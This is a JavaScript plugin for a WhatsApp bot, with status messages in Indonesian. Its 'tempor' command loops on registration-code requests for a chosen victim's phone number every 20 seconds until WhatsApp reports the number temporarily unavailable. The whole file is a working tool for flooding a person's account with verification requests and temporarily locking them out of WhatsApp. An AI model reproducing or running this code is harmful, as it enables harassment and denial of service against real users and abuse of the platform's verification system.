const fs = require('fs');
const path = require('path');
const pino = require('pino');
const { default: makeWaSocket, useMultiFileAuthState } = require('@whiskeysockets/baileys');
const { addSession, getSession, removeSession } = require('../lib/activesession');

const temporFilePath = path.join(__dirname, '../src', 'tempor.json');

const saveTemporData = (data) => {
    fs.writeFileSync(temporFilePath, JSON.stringify(data, null, 2));
};

const loadTemporData = () => {
    if (fs.existsSync(temporFilePath)) {
        const data = fs.readFileSync(temporFilePath, 'utf-8');
        if (data.trim().length === 0) {
            return {};
        }
        return JSON.parse(data);
    }
    return {};
};

let temporData = loadTemporData();

const temporHandler = async (m, { args, usedPrefix, command }) => {
    if (!args[0] || !args[1]) {
        throw `• *Example :* ${usedPrefix}${command} +62 889-8087-0067`;
    }

    const countryCode = args[0];
    const nationalNumber = args[1];
    const fullNumber = countryCode + nationalNumber;

    if (getSession(fullNumber) && getSession(fullNumber).isRunning) {
        m.reply(`Proses tempor untuk nomor ${fullNumber} sudah berjalan.`);
        return;
    }

    temporData[fullNumber] = { isRunning: true };
    saveTemporData(temporData);

    let stopTemporProcess = false;

    addSession(fullNumber, {
        isRunning: true,
        stop: () => {
            stopTemporProcess = true;
            temporData[fullNumber].isRunning = false;
            saveTemporData(temporData); // Simpan status saat proses dihentikan
        }
    });

    const delay = ms => new Promise(resolve => setTimeout(resolve, ms));

    const temporProcess = async () => {
        const authState = await useMultiFileAuthState('tmp/' + fullNumber);
        const conn = makeWaSocket({
            auth: authState.state,
            logger: pino({ level: 'silent' }),
            printQRInTerminal: false,
        });

        while (!stopTemporProcess) {
            console.log(`Running process for ${fullNumber}`);

            try {
                let result = await conn.requestRegistrationCode({
                    phoneNumberCountryCode: countryCode,
                    phoneNumberNationalNumber: nationalNumber,
                    phoneNumberMobileCountryCode: 724 
                });

                if (result.reason === 'temporarily_unavailable') {
                    m.reply(`WhatsApp untuk nomor ${fullNumber} tidak tersedia untuk sementara waktu. Coba lagi dalam beberapa menit.`);
                    break;
                }

            } catch (err) {
                console.error(`Error processing tempor for ${fullNumber}:`, err);
            }

            await delay(20000); 

            if (!getSession(fullNumber).isRunning) {
                break;
            }
        }

        console.log(`Process for ${fullNumber} stopped.`);
        removeSession(fullNumber);
    };

    temporProcess();

    m.reply(`Proses tempor dimulai untuk nomor ${fullNumber}.`);
};

temporHandler.help = ['tempor'];
temporHandler.tags = ['owner'];
temporHandler.command = /^tempory|temp|tempor$/i;
temporHandler.rowner = true;
temporHandler.limit = true;
temporHandler.private = false;

module.exports = temporHandler;